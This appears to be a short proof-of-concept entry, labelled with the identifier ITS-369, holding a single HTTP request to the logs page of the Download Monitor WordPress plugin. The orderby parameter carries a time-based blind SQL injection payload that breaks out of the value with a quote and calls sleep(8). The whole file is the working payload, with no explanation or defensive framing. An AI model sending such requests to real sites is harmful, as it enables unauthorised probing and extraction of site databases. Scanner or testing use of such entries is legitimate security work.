# Vulnerable: ITS-369
GET /wp-admin/edit.php?post_type=dlm_download&page=download-monitor-logs&orderby=download_date'+and+(select+sleep(8))+and+'user_id=user_id
